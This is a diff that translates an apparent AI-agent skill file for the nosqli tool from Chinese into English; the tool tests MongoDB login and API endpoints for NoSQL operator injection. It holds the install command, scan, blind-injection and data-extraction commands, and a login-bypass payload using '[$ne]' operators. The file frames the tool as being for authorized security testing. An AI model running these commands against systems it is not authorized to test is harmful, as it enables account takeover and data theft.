@@ -2,38 +2,41 @@
 name: nosqli-mongo-injection
 description: "NoSQL login bypass. Signals: web vulnerability, injection, MongoDB injection scan, blind injection, data extraction."
 zh-signals: "nosqli: 登录接口 NoSQL 绕过。信号:web漏洞,注入,MongoDB 注入扫描,盲注模式,数据提取。"
+when-to-use: >-
+  Use when testing authorized login or API endpoints backed by MongoDB for NoSQL operator
+  injection, including blind injection and data extraction through GET or POST parameters.
 ---
 
 # nosqli
 
-- 攻击大类:C09 Web利用(NoSQL注入)
-- 上游仓库:https://github.com/Charlie-belmer/nosqli
-- 上游 License:AgPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C09 Web Exploitation (NoSQL Injection)
+- Upstream Repository: https://github.com/Charlie-belmer/nosqli
+- Upstream License: AgPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/Charlie-belmer/nosqli && cd nosqli && go build -o nosqli
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `./nosqli scan -u 'https://t.com/login'` | MongoDB 注入扫描 |
-| `./nosqli scan -t body -p email -u url -d 'email=x&pass=y'` | POST body 参数注入 |
-| `inject -u url` | 盲注模式 |
-| `extract -u url` | 数据提取 |
+| `./nosqli scan -u 'https://t.com/login'` | MongoDB injection scan |
+| `./nosqli scan -t body -p email -u url -d 'email=x&pass=y'` | POST body parameter injection |
+| `inject -u url` | Blind injection mode |
+| `extract -u url` | Data extraction |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 登录接口 NoSQL 绕过
+### NoSQL bypass on login endpoints
 
 ```bash
 ./nosqli scan -u 'https://api.t.com/auth' -t body -p username -d 'username[$ne]=x&password[$ne]=x'
-# [$ne] 永真比较绕过登录,工具自动探测
+# [$ne] always-true comparison bypasses login; the tool auto-detects it
 ```
 
-## 注意事项
+## Notes
 
-Go 编写,对 JSON/body 中的 Mongo 操作符注入($ne/$gt/$regex)做盲注与数据提取。
+Written in Go, performs blind injection and data extraction against Mongo operator injection in JSON/body ($ne/$gt/$regex).
